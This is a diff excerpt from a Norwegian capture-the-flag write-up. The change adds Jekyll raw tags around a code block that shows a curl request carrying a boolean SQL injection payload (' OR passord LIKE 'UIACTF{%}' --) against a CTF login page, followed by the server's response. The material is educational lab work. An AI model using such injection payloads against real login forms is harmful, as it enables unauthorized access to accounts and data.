@@ -173,12 +173,14 @@ Og så videre...
 
 En siste kvalifisert gjetning før vi fortsetter. Vi forventer å finne et flagg i `passord`-kolonnen. La os sjekke om passordet matcher flaggformatet:
 
+{% raw  %}
 ```bash
 $ curl -s 'http://ctf.uiactf.no:3005/index.php?page=login.php' -d "epost=admin@minkulewebapp.finnesikke&login=login&passord=' OR passord LIKE 'UIACTF{%}' --" | grep -E 'Notice|Fatal|Feil
  brukernavn eller passord'
 
 <b>Notice</b>:  session_start(): Ignoring session_start() because a session is already active in <b>/usr/src/myapp/login.php</b> on line <b>2</b><br />
 ```
+{% endraw  %}
 
 ^ **TRUE**-resultat!
 
